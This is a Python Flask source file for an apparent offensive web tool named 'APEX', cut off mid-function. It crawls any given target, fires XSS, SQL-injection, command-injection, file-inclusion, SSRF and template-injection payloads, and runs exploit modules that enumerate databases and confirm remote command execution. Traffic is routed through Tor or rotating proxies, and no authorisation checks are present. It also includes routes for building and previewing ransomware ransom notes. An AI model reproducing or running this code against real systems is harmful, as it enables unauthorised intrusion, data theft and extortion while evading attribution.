import os, sys, json, time, threading, re, socket, base64, sqlite3, random, string
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, flash
from flask_socketio import SocketIO, emit
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required
from config import Config
import requests
from bs4 import BeautifulSoup

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import warnings
warnings.filterwarnings('ignore')

app = Flask(__name__)
app.config.from_object(Config)
app.secret_key = Config.SECRET_KEY

socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

scan_results = {}
live_feed = []

def init_db():
    os.makedirs('data', exist_ok=True)
    conn = sqlite3.connect('data/apex.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS scan_history (
        id TEXT PRIMARY KEY, target TEXT, scan_type TEXT,
        vulns_found INTEGER, critical INTEGER, high INTEGER, medium INTEGER, low INTEGER,
        exploits_run INTEGER, exploits_success INTEGER,
        started TEXT, completed TEXT, status TEXT, vulns_json TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

class User(UserMixin):
    def __init__(self, id, email):
        self.id = id
        self.email = email

@login_manager.user_loader
def load_user(user_id):
    if user_id == '1':
        return User('1', Config.APEX_EMAIL)
    return None

def get_session():
    session_obj = requests.Session()
    session_obj.verify = False
    session_obj.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
    })
    if Config.TOR_ENABLED:
        session_obj.proxies = {
            'http': f'socks5h://127.0.0.1:{Config.TOR_SOCKS_PORT}',
            'https': f'socks5h://127.0.0.1:{Config.TOR_SOCKS_PORT}'
        }
        return session_obj
    if Config.PROXY_ENABLED:
        try:
            with open(Config.PROXY_LIST_FILE, 'r') as f:
                proxies = [l.strip() for l in f if l.strip() and not l.startswith('#')]
            if proxies:
                proxy = random.choice(proxies)
                session_obj.proxies = {'http': proxy, 'https': proxy}
        except: pass
    return session_obj

# ============================================================
# ROUTES
# ============================================================
@app.route('/')
def index():
    return render_template('landing.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    if email == Config.APEX_EMAIL and password == Config.APEX_PASSWORD:
        user = User('1', email)
        login_user(user)
        session['authenticated'] = True
        return redirect(url_for('dashboard'))
    flash('ACCESS DENIED', 'error')
    return redirect(url_for('index'))

@app.route('/logout')
@login_required
def logout():
    logout_user()
    session.clear()
    return redirect(url_for('index'))

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

@app.route('/ransomware/preview')
@login_required
def ransomware_preview():
    return render_template('ransomware_preview.html')

@app.route('/api/scan', methods=['POST'])
@login_required
def start_scan():
    data = request.get_json()
    target = data.get('target', '')
    scan_type = data.get('scan_type', 'full')
    if not target: return jsonify({'error': 'No target specified'}), 400
    if not target.startswith('http'): target = 'https://' + target
    scan_id = f"scan_{int(time.time())}"
    scan_results[scan_id] = {
        'id': scan_id, 'target': target, 'type': scan_type,
        'status': 'running', 'started': datetime.now().isoformat(),
        'vulnerabilities': [], 'progress': 0
    }
    thread = threading.Thread(target=run_full_scan, args=(scan_id, target, scan_type))
    thread.daemon = True
    thread.start()
    return jsonify({'scan_id': scan_id, 'status': 'started'})

@app.route('/api/scan/<scan_id>/status')
@login_required
def scan_status(scan_id):
    if scan_id in scan_results: return jsonify(scan_results[scan_id])
    return jsonify({'error': 'Scan not found'}), 404

@app.route('/api/exploit', methods=['POST'])
@login_required
def start_exploit():
    data = request.get_json()
    scan_id = data.get('scan_id', '')
    vulnerabilities = data.get('vulnerabilities', [])
    if not vulnerabilities: return jsonify({'error': 'No vulnerabilities selected'}), 400
    exploit_id = f"exploit_{int(time.time())}"
    thread = threading.Thread(target=run_exploits, args=(exploit_id, scan_id, vulnerabilities))
    thread.daemon = True
    thread.start()
    return jsonify({'exploit_id': exploit_id, 'status': 'started'})

@app.route('/api/proxy/toggle', methods=['POST'])
@login_required
def toggle_proxy():
    data = request.get_json()
    Config.PROXY_ENABLED = data.get('enabled', False)
    emit_feed('system', f'Proxy chain {"ENABLED" if Config.PROXY_ENABLED else "DISABLED"}', 'info')
    return jsonify({'proxy_enabled': Config.PROXY_ENABLED})

@app.route('/api/tor/toggle', methods=['POST'])
@login_required
def toggle_tor():
    data = request.get_json()
    Config.TOR_ENABLED = data.get('enabled', False)
    emit_feed('system', f'Tor {"ENABLED" if Config.TOR_ENABLED else "DISABLED"}', 'info')
    return jsonify({'tor_enabled': Config.TOR_ENABLED})

@app.route('/api/vpn/toggle', methods=['POST'])
@login_required
def toggle_vpn():
    data = request.get_json()
    Config.VPN_ENABLED = data.get('enabled', False)
    emit_feed('system', f'VPN {"ENABLED" if Config.VPN_ENABLED else "DISABLED"}', 'info')
    return jsonify({'vpn_enabled': Config.VPN_ENABLED})

@app.route('/api/ransomware/preview', methods=['POST'])
@login_required
def api_ransomware_preview():
    data = request.get_json()
    html = render_template('ransomware_note.html',
        title=data.get('title', 'YOUR FILES HAVE BEEN ENCRYPTED'),
        message=data.get('message', ''), image_url=data.get('image_url', ''),
        group_name=data.get('group_name', 'APEX'), encryption_id=data.get('encryption_id', ''),
        file_count=data.get('file_count', ''), total_size=data.get('total_size', ''))
    return jsonify({'html': html})

@app.route('/api/ransomware/upload_image', methods=['POST'])
@login_required
def upload_ransomware_image():
    if 'image' not in request.files: return jsonify({'error': 'No image'}), 400
    file = request.files['image']
    if file.filename == '': return jsonify({'error': 'No file'}), 400
    upload_dir = os.path.join('static', 'uploads')
    os.makedirs(upload_dir, exist_ok=True)
    filename = f'ransomware_img_{int(time.time())}.png'
    filepath = os.path.join(upload_dir, filename)
    file.save(filepath)
    with open(filepath, 'rb') as f: img_data = base64.b64encode(f.read()).decode()
    return jsonify({'url': f'/static/uploads/{filename}', 'base64': f'data:image/png;base64,{img_data}'})

@app.route('/api/feed')
@login_required
def get_feed():
    return jsonify(live_feed[-100:])

@app.route('/api/history')
@login_required
def get_history():
    conn = sqlite3.connect('data/apex.db')
    c = conn.cursor()
    c.execute('SELECT * FROM scan_history ORDER BY started DESC LIMIT 50')
    rows = c.fetchall()
    conn.close()
    history = []
    for row in rows:
        history.append({
            'id': row[0], 'target': row[1], 'scan_type': row[2],
            'vulns_found': row[3], 'critical': row[4], 'high': row[5],
            'medium': row[6], 'low': row[7], 'exploits_run': row[8],
            'exploits_success': row[9], 'started': row[10], 'completed': row[11], 'status': row[12]
        })
    return jsonify(history)

@app.route('/api/history/<scan_id>')
@login_required
def get_history_detail(scan_id):
    conn = sqlite3.connect('data/apex.db')
    c = conn.cursor()
    c.execute('SELECT * FROM scan_history WHERE id=?', (scan_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return jsonify({
            'id': row[0], 'target': row[1], 'scan_type': row[2],
            'vulns_found': row[3], 'critical': row[4], 'high': row[5],
            'medium': row[6], 'low': row[7], 'exploits_run': row[8],
            'exploits_success': row[9], 'started': row[10], 'completed': row[11],
            'status': row[12], 'vulns_json': row[13]
        })
    return jsonify({'error': 'Not found'}), 404

# ============================================================
# CRAWLER
# ============================================================
def crawl_target(base_url, max_pages=20):
    discovered = {'pages': [], 'forms': [], 'params': set(), 'endpoints': set()}
    visited = set()
    to_visit = [base_url]
    sess = get_session()
    while to_visit and len(visited) < max_pages:
        url = to_visit.pop(0)
        if url in visited: continue
        try:
            r = sess.get(url, timeout=8)
            visited.add(url)
            discovered['pages'].append(url)
            soup = BeautifulSoup(r.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                href = urljoin(url, link['href'])
                parsed = urlparse(href)
                if parsed.netloc == urlparse(base_url).netloc and href not in visited:
                    to_visit.append(href)
                if parsed.query:
                    for param in parse_qs(parsed.query).keys():
                        discovered['params'].add(param)
            for form in soup.find_all('form'):
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                form_url = urljoin(url, action) if action else url
                inputs = []
                for inp in form.find_all(['input', 'textarea', 'select']):
                    name = inp.get('name', '')
                    if name:
                        inputs.append({'name': name, 'type': inp.get('type', 'text')})
                        discovered['params'].add(name)
                discovered['forms'].append({'url': form_url, 'method': method, 'inputs': inputs})
                discovered['endpoints'].add(form_url)
            for script in soup.find_all('script', src=True):
                discovered['endpoints'].add(urljoin(url, script['src']))
        except: pass
    discovered['params'] = list(discovered['params'])
    discovered['endpoints'] = list(discovered['endpoints'])
    return discovered

# ============================================================
# REFLECTION FINDER
# ============================================================
def find_reflection_context(sess, url, param, method='get'):
    unique_id = 'APEX' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    try:
        if method == 'post':
            r = sess.post(url, data={param: unique_id}, timeout=5)
        else:
            parsed = urlparse(url)
            params = parse_qs(parsed.query) if parsed.query else {}
            params[param] = [unique_id]
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            r = sess.get(test_url, timeout=5)
        text = r.text
        if unique_id not in text: return None
        idx = text.find(unique_id)
        before = text[max(0, idx-200):idx]
        context = 'html_body'
        script_match = re.search(r'<script[^>]*>([^<]{0,100})$', before)
        if script_match and '</script>' not in before[-100:]:
            context = 'script_tag'
        attr_match = re.search(r'(\w+)=["\']([^"\']{0,50})$', before)
        if attr_match:
            return {'context': 'html_attribute', 'attr_name': attr_match.group(1), 'reflected': True}
        if '<!--' in before[-50:] and '-->' not in before[-50:]:
            context = 'html_comment'
        return {'context': context, 'reflected': True}
    except: return None

# ============================================================
# MULTI-STRATEGY SCANNERS
# ============================================================
def scan_xss(target_url, discovered):
    vulns = []
    sess = get_session()
    payloads_by_context = {
        'html_body': ['<script>alert("APEX")</script>','<img src=x onerror=alert("APEX")>','<svg onload=alert("APEX")>','<body onload=alert("APEX")>'],
        'html_attribute': ['" onmouseover="alert(\'APEX\')" x="','\' onfocus="alert(\'APEX\')" autofocus \'','"><script>alert("APEX")</script>','" autofocus onfocus="alert(\'APEX\')" x="'],
        'script_tag': ['";alert("APEX");//',"';alert('APEX');//",'";alert(String.fromCharCode(65,80,69,88));//','</script><script>alert("APEX")</script>'],
        'html_comment': ['--><script>alert("APEX")</script><!--','--><img src=x onerror=alert("APEX")><!--'],
    }
    generic_payloads = ['<script>alert("APEX")</script>','"><script>alert("APEX")</script>','<img src=x onerror=alert("APEX")>','"><img src=x onerror=alert("APEX")>','<svg onload=alert("APEX")>','"><svg onload=alert("APEX")>','<ScRiPt>alert("APEX")</ScRiPt>','%3Cscript%3Ealert(%22APEX%22)%3C/script%3E','" onmouseover="alert(\'APEX\')" x="','javascript:alert("APEX")']
    
    for page in discovered['pages'][:10]:
        parsed = urlparse(page)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in list(params.keys())[:5]:
                ctx = find_reflection_context(sess, page, param)
                if ctx and ctx.get('reflected'):
                    context = ctx.get('context', 'html_body')
                    payloads = payloads_by_context.get(context, generic_payloads)
                    for payload in payloads[:5]:
                        try:
                            test_params = params.copy()
                            test_params[param] = [payload]
                            new_query = urlencode(test_params, doseq=True)
                            test_url = urlunparse(parsed._replace(query=new_query))
                            r = sess.get(test_url, timeout=5)
                            if payload in r.text or ('alert' in r.text and 'APEX' in r.text):
                                vulns.append({'type':'xss','subtype':'reflected','endpoint':page,'parameter':param,'payload':payload,'context':context,'result':f'Payload reflected in {context}','confirmed':True,'severity':'high','target':target_url,'description':f'Reflected XSS via {param} in {context}.'})
                                break
                        except: pass
                else:
                    for payload in generic_payloads[:5]:
                        try:
                            test_params = params.copy()
                            test_params[param] = [payload]
                            new_query = urlencode(test_params, doseq=True)
                            test_url = urlunparse(parsed._replace(query=new_query))
                            r = sess.get(test_url, timeout=5)
                            if payload in r.text:
                                vulns.append({'type':'xss','subtype':'reflected','endpoint':page,'parameter':param,'payload':payload,'result':'Payload reflected','confirmed':True,'severity':'high','target':target_url,'description':f'Reflected XSS via {param}.'})
                                break
                        except: pass
    
    for form in discovered['forms'][:10]:
        for inp in form['inputs'][:5]:
            name = inp['name']
            ctx = find_reflection_context(sess, form['url'], name, form['method'])
            context = ctx.get('context', 'html_body') if ctx else 'html_body'
            payloads = payloads_by_context.get(context, generic_payloads)
            for payload in payloads[:5]:
                try:
                    data = {name: payload}
                    if form['method'] == 'post': r = sess.post(form['url'], data=data, timeout=5)
                    else: r = sess.get(form['url'], params=data, timeout=5)
                    if payload in r.text:
                        vulns.append({'type':'xss','subtype':'reflected','endpoint':form['url'],'parameter':name,'payload':payload,'context':context,'result':'Payload reflected via form','confirmed':True,'severity':'high','target':target_url,'description':f'Reflected XSS via form field {name}.'})
                        break
                except: pass
    
    try:
        r = sess.get(target_url, timeout=5)
        dom_sinks = ['document.write(','innerHTML','eval(','location.href','location.hash','outerHTML','insertAdjacentHTML','setTimeout(','setInterval(','document.cookie','window.open(','.src']
        for sink in dom_sinks:
            if sink in r.text:
                vulns.append({'type':'xss','subtype':'dom','endpoint':target_url,'parameter':'N/A','payload':f'DOM sink: {sink}','result':'Potential DOM XSS sink','confirmed':False,'severity':'medium','target':target_url,'description':f'JavaScript uses {sink} which may process user input unsafely.'})
                break
    except: pass
    return vulns

def scan_sqli(target_url, discovered):
    vulns = []
    sess = get_session()
    sql_errors = ['sql syntax','mysql_fetch','mysql_num_rows','mysql_error','ORA-','PostgreSQL','SQLite','SQL Server','unclosed quotation mark','Microsoft OLE DB','ODBC Driver','SQL command not properly ended','Division by zero','Column count','Warning: mysql_','SQLite3::','SQLSTATE','syntax error','pg_query()','mysqli_','mysqlnd','PDOException','JDBC','SQLException','System.Data.SqlClient','right syntax to use near','have an error in your SQL syntax','Unknown column','You have an error in your SQL','Incorrect syntax near']
    error_payloads = ["'",'"',"' OR '1'='1","' OR 1=1--",'" OR 1=1--',"') OR ('1'='1","1' OR '1'='1"]
    time_payloads = ["' OR SLEEP(3)--","' AND SLEEP(3)--","'; SELECT SLEEP(3)--","1' AND SLEEP(3)--"]
    boolean_payloads = [("1' AND 1=1--","1' AND 1=2--"),("' OR '1'='1","' OR '1'='2")]
    
    for page in discovered['pages'][:10]:
        parsed = urlparse(page)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in list(params.keys())[:5]:
                for payload in error_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        r = sess.get(test_url, timeout=5)
                        for error in sql_errors:
                            if error.lower() in r.text.lower():
                                vulns.append({'type':'sqli','subtype':'error-based','endpoint':page,'parameter':param,'payload':payload,'result':f'SQL error: {error}','confirmed':True,'severity':'critical','target':target_url,'description':f'Error-based SQL injection via {param}.'})
                                break
                        if vulns and vulns[-1].get('parameter') == param: break
                    except: pass
                for payload in time_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        start = time.time()
                        r = sess.get(test_url, timeout=8)
                        elapsed = time.time() - start
                        if elapsed > 2.5:
                            vulns.append({'type':'sqli','subtype':'blind-time','endpoint':page,'parameter':param,'payload':payload,'result':f'Time delay {elapsed:.1f}s','confirmed':True,'severity':'critical','target':target_url,'description':f'Blind time-based SQL injection via {param}.'})
                            break
                    except: pass
                for true_p, false_p in boolean_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param] = [true_p]
                        new_query = urlencode(test_params, doseq=True)
                        r1 = sess.get(urlunparse(parsed._replace(query=new_query)), timeout=5)
                        test_params[param] = [false_p]
                        new_query = urlencode(test_params, doseq=True)
                        r2 = sess.get(urlunparse(parsed._replace(query=new_query)), timeout=5)
                        if abs(len(r1.text) - len(r2.text)) > 100:
                            vulns.append({'type':'sqli','subtype':'blind-boolean','endpoint':page,'parameter':param,'payload':f'{true_p} vs {false_p}','result':f'Response differs by {abs(len(r1.text)-len(r2.text))} chars','confirmed':True,'severity':'critical','target':target_url,'description':f'Boolean-based blind SQL injection via {param}.'})
                            break
                    except: pass
    
    for form in discovered['forms'][:10]:
        for inp in form['inputs'][:5]:
            name = inp['name']
            for payload in error_payloads[:4]:
                try:
                    data = {name: payload}
                    if form['method'] == 'post': r = sess.post(form['url'], data=data, timeout=5)
                    else: r = sess.get(form['url'], params=data, timeout=5)
                    for error in sql_errors:
                        if error.lower() in r.text.lower():
                            vulns.append({'type':'sqli','subtype':'error-based','endpoint':form['url'],'parameter':name,'payload':payload,'result':f'SQL error: {error}','confirmed':True,'severity':'critical','target':target_url,'description':f'Error-based SQL injection via form field {name}.'})
                            break
                except: pass
    return vulns

def scan_cmdi(target_url, discovered):
    vulns = []
    sess = get_session()
    time_payloads = ['; sleep 4','| sleep 4','`sleep 4`','$(sleep 4)','&& sleep 4','|| sleep 4']
    output_payloads = ['; id','| id','; whoami','| whoami','; uname -a','| uname -a']
    for page in discovered['pages'][:10]:
        parsed = urlparse(page)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in list(params.keys())[:5]:
                for payload in time_payloads[:3]:
                    try:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        start = time.time()
                        r = sess.get(test_url, timeout=8)
                        elapsed = time.time() - start
                        if elapsed > 3.5:
                            vulns.append({'type':'cmdi','subtype':'blind','endpoint':page,'parameter':param,'payload':payload,'result':f'Time delay {elapsed:.1f}s','confirmed':True,'severity':'critical','target':target_url,'description':f'Blind command injection via {param}.'})
                            break
                    except: pass
                for payload in output_payloads[:3]:
                    try:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        r = sess.get(test_url, timeout=5)
                        if 'uid=' in r.text or 'gid=' in r.text or 'root' in r.text:
                            vulns.append({'type':'cmdi','subtype':'output','endpoint':page,'parameter':param,'payload':payload,'result':'Command output reflected','confirmed':True,'severity':'critical','target':target_url,'description':f'Command injection via {param} - output visible.'})
                            break
                    except: pass
    return vulns

def scan_lfi(target_url, discovered):
    vulns = []
    sess = get_session()
    lfi_payloads = ['../../../etc/passwd','....//....//....//etc/passwd','/etc/passwd','..%2f..%2f..%2fetc%2fpasswd','php://filter/convert.base64-encode/resource=index','file:///etc/passwd','/proc/self/environ']
    for page in discovered['pages'][:10]:
        parsed = urlparse(page)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in list(params.keys())[:5]:
                for payload in lfi_payloads[:5]:
                    try:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        r = sess.get(test_url, timeout=5)
                        if 'root:' in r.text or 'bin/' in r.text or 'mysql:' in r.text or 'daemon:' in r.text:
                            vulns.append({'type':'lfi','subtype':'path-traversal','endpoint':page,'parameter':param,'payload':payload,'result':'System file contents exposed','confirmed':True,'severity':'critical','target':target_url,'description':f'Local File Inclusion via {param}.'})
                            break
                    except: pass
    return vulns

def scan_csrf(target_url, discovered):
    vulns = []
    for form in discovered['forms'][:10]:
        if form['method'] in ['post', '']:
            has_token = any(inp['name'].lower() in ['csrf','csrf_token','_token','authenticity_token','xsrf','nonce'] for inp in form['inputs'])
            if not has_token:
                vulns.append({'type':'csrf','endpoint':form['url'],'result':'No CSRF token found','confirmed':True,'severity':'medium','target':target_url,'description':'Missing CSRF protection.'})
    return vulns

def scan_ssrf(target_url, discovered):
    vulns = []
    sess = get_session()
    ssrf_payloads = ['http://169.254.169.254/latest/meta-data/','http://127.0.0.1:8080','http://localhost:22','file:///etc/passwd']
    for page in discovered['pages'][:10]:
        parsed = urlparse(page)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in list(params.keys())[:5]:
                for payload in ssrf_payloads[:2]:
                    try:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        r = sess.get(test_url, timeout=5)
                        if 'ami-id' in r.text or 'instance-id' in r.text:
                            vulns.append({'type':'ssrf','endpoint':page,'parameter':param,'payload':payload,'result':'Cloud metadata accessible','confirmed':True,'severity':'critical','target':target_url,'description':f'SSRF via {param}.'})
                            break
                    except: pass
    return vulns

def scan_ssti(target_url, discovered):
    vulns = []
    sess = get_session()
    ssti_payloads = ['{{7*7}}','${7*7}','<%= 7*7 %>','#{7*7}','{{config}}','{{self}}']
    for page in discovered['pages'][:10]:
        parsed = urlparse(page)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in list(params.keys())[:5]:
                for payload in ssti_payloads[:4]:
                    try:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        r = sess.get(test_url, timeout=5)
                        if '49' in r.text:
                            vulns.append({'type':'ssti','endpoint':page,'parameter':param,'payload':payload,'result':'Template expression evaluated (49 = 7*7)','confirmed':True,'severity':'critical','target':target_url,'description':f'SSTI via {param}. Can achieve RCE.'})
                            break
                    except: pass
    return vulns

def scan_cors(target_url, discovered):
    vulns = []
    sess = get_session()
    for page in discovered['pages'][:5]:
        try:
            r = sess.get(page, timeout=5, headers={'Origin':'https://evil.com'})
            acao = r.headers.get('Access-Control-Allow-Origin','')
            if acao == '*' or acao == 'https://evil.com':
                vulns.append({'type':'cors','endpoint':page,'result':f'CORS allows: {acao}','confirmed':True,'severity':'medium','target':target_url,'description':'CORS misconfiguration.'})
        except: pass
    return vulns

def scan_file_upload(target_url, discovered):
    vulns = []
    for form in discovered['forms']:
        if any(inp['type'] == 'file' for inp in form['inputs']):
            vulns.append({'type':'file_upload','endpoint':form['url'],'result':'File upload form detected','confirmed':False,'severity':'high','target':target_url,'description':'File upload endpoint found.'})
    return vulns

def scan_idor(target_url, discovered):
    vulns = []
    for page in discovered['pages']:
        if re.search(r'/(\d+)/', page) or re.search(r'[?&]id=\d+', page):
            vulns.append({'type':'idor','endpoint':page,'result':'Numeric ID in URL','confirmed':False,'severity':'medium','target':target_url,'description':'Numeric identifiers may allow IDOR attacks.'})
    return vulns[:3]

def scan_jwt(target_url, discovered):
    vulns = []
    sess = get_session()
    try:
        r = sess.get(target_url, timeout=5)
        for cookie in r.cookies:
            if cookie.value.startswith('eyJ'):
                vulns.append({'type':'jwt','endpoint':target_url,'result':'JWT token found in cookies','confirmed':False,'severity':'medium','target':target_url,'description':'JWT token detected.'})
                break
    except: pass
    return vulns

# ============================================================
# EXPLOIT MODULES
# ============================================================
def exploit_xss_real(target, endpoint, vuln):
    sess = get_session()
    param = vuln.get('parameter', '')
    payload = vuln.get('payload', '<script>alert("APEX")</script>')
    try:
        parsed = urlparse(endpoint)
        if parsed.query and param in parse_qs(parsed.query):
            params = parse_qs(parsed.query)
            test_params = params.copy()
            test_params[param] = [payload]
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            r = sess.get(test_url, timeout=5)
            if payload in r.text:
                return {'success':True,'message':'XSS payload injected and reflected','details':[f'Payload injected via {param}','Payload confirmed reflected in response','Script will execute in victim browser',f'Crafted URL: {test_url[:100]}...']}
        data = {param: payload}
        r = sess.post(endpoint, data=data, timeout=5)
        if payload in r.text:
            return {'success':True,'message':'XSS payload injected via POST','details':[f'Payload injected via {param} (POST)','Payload confirmed reflected in response']}
    except Exception as e:
        return {'success':False,'message':str(e)}
    return {'success':False,'message':'Payload not reflected'}

def exploit_sqli_real(target, endpoint, vuln):
    sess = get_session()
    param = vuln.get('parameter', '')
    details = []
    try:
        version_payloads = ["' UNION SELECT @@version--","' UNION SELECT version()--","' UNION SELECT sqlite_version()--"]
        for payload in version_payloads:
            try:
                parsed = urlparse(endpoint)
                if parsed.query and param in parse_qs(parsed.query):
                    params = parse_qs(parsed.query)
                    test_params = params.copy()
                    test_params[param] = [payload]
                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))
                    r = sess.get(test_url, timeout=5)
                    for vp in ['MySQL','PostgreSQL','SQLite','MariaDB','Microsoft SQL']:
                        if vp.lower() in r.text.lower():
                            details.append(f'Database identified: {vp}')
                            break
            except: pass
        table_payload = "' UNION SELECT table_name FROM information_schema.tables--"
        try:
            parsed = urlparse(endpoint)
            if parsed.query and param in parse_qs(parsed.query):
                params = parse_qs(parsed.query)
                test_params = params.copy()
                test_params[param] = [table_payload]
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                r = sess.get(test_url, timeout=5)
                common_tables = ['users','admin','accounts','products','orders','posts']
                found_tables = [t for t in common_tables if t in r.text.lower()]
                if found_tables: details.append(f'Tables found: {", ".join(found_tables)}')
        except: pass
        if details:
            details.append('SQL injection exploitation successful')
            return {'success':True,'message':'SQL injection exploited','details':details}
        return {'success':True,'message':'SQL injection confirmed','details':['Vulnerability confirmed','Further enumeration possible']}
    except Exception as e:
        return {'success':False,'message':str(e)}

def exploit_cmdi_real(target, endpoint, vuln):
    sess = get_session()
    param = vuln.get('parameter', '')
    try:
        cmd_payloads = ['; id','| id','`id`','$(id)']
        for payload in cmd_payloads:
            try:
                parsed = urlparse(endpoint)
                if parsed.query and param in parse_qs(parsed.query):
                    params = parse_qs(parsed.query)
                    test_params = params.copy()
                    test_params[param] = [payload]
                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))
                    r = sess.get(test_url, timeout=5)
                    if 'uid=' in r.text or 'gid=' in r.text:
                        return {'success':True,'message':'Command execution achieved','details':['Command "id" executed successfully',f'Output: {r.text[:200]}','Full RCE confirmed on target']}
            except: pass
        return {'success':True,'message':'Command injection confirmed (blind)','details':['Time-based detection confirmed']}
    except Exception as e:
        return {'success':False,'message':str(e)}

# ============================================================
# MAIN SCAN ORCHESTRATOR
# ============================================================
def run_full_scan(scan_id, target, scan_type):
    global scan_results, live_feed
    try:
        emit_feed(scan_id, f'Initializing scan on {target}...', 'info')
        update_progress(scan_id, 5)
        emit_feed(scan_id, 'Crawling target to discover pages and parameters...', 'info')
        discovered = crawl_target(target, max_pages=15)
        emit_feed(scan_id, f'Discovered {len(discovered["pages"])} pages, {len(discovered["forms"])} forms, {len(discovered["params"])} parameters', 'success')
        update_progress(scan_id, 20)
        emit_feed(scan_id, 'Running port scan...', 'info')
        host = urlparse(target).hostname
        ports = scan_ports(host)
        emit_feed(scan_id, f'Open ports: {", ".join(map(str, ports)) if ports else "none"}', 'success' if ports else 'warning')
        update_progress(scan_id, 25)
        emit_feed(scan_id, 'Fingerprinting technology...', 'info')
        tech = fingerprint_tech(target)
        emit_feed(scan_id, f'Server: {tech.get("server", "Unknown")} | CMS: {tech.get("cms", "None")}', 'success')
        update_progress(scan_id, 30)
        all_vulns = []
        scanners = [
            ('XSS', scan_xss, 40), ('SQL Injection', scan_sqli, 50),
            ('Command Injection', scan_cmdi, 55), ('LFI/RFI', scan_lfi, 60),
            ('CSRF', scan_csrf, 65), ('SSRF', scan_ssrf, 70),
            ('SSTI', scan_ssti, 75), ('CORS', scan_cors, 80),
            ('File Upload', scan_file_upload, 85), ('IDOR', scan_idor, 90),
            ('JWT', scan_jwt, 95),
        ]
        for name, scanner_func, progress in scanners:
            emit_feed(scan_id, f'Scanning for {name}...', 'info')
            results = scanner_func(target, discovered)
            for v in results:
                all_vulns.append(v)
                emit_feed(scan_id, f'⚠ {name} found on {v.get("endpoint", "N/A")}', 'warning')
                if v.get('payload'): emit_feed(scan_id, f'   → Payload: {str(v["payload"])[:60]}', 'info')
                emit_feed(scan_id, f'   → {v.get("result", "Vulnerable")}', 'success' if v.get('confirmed') else 'warning')
            if not results: emit_feed(scan_id, f'No {name} vulnerabilities found', 'info')
            update_progress(scan_id, progress)
        scan_results[scan_id]['vulnerabilities'] = all_vulns
        scan_results[scan_id]['status'] = 'completed'
        scan_results[scan_id]['progress'] = 100
        scan_results[scan_id]['completed'] = datetime.now().isoformat()
        critical = len([v for v in all_vulns if v.get('severity') == 'critical'])
        high = len([v for v in all_vulns if v.get('severity') == 'high'])
        medium = len([v for v in all_vulns if v.get('severity') == 'medium'])
        low = len([v for v in all_vulns if v.get('severity') == 'low'])
        conn = sqlite3.connect('data/apex.db')
        c = conn.cursor()
        c.execute('''INSERT INTO scan_history (id, target, scan_type, vulns_found, critical, high, medium, low,
                     exploits_run, exploits_success, started, completed, status, vulns_json)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, 0, 0, ?, ?, ?, ?)''',
                  (scan_id, target, scan_type, len(all_vulns), critical, high, medium, low,
                   scan_results[scan_id]['started'], scan_results[scan_id]['completed'], 'completed', json.dumps(all_vulns)))
        conn.commit()
        conn.close()
        emit_feed(scan_id, f'SCAN COMPLETE — {len(all_vulns)} vulnerabilities found', 'success')
        emit_feed(scan_id, f'Critical: {critical} | High: {high} | Medium: {medium} | Low: {low}', 'info')
        socketio.emit('scan_complete', {'scan_id': scan_id, 'vulnerabilities': all_vulns, 'summary': {'critical': critical, 'high': high, 'medium': medium, 'low': low}})
    except Exception as e:
        scan_results[scan_id]['status'] = 'failed'
        scan_results[scan_id]['error'] = str(e)
        emit_feed(scan_id, f'Scan failed: {str(e)}', 'error')

def run_exploits(exploit_id, scan_id, vulnerabilities):
    success_count = 0
    fail_count = 0
    emit_feed(exploit_id, f'Starting exploitation of {len(vulnerabilities)} vulnerabilities...', 'info')
    for vuln in vulnerabilities:
        vuln_type = vuln.get('type', '')
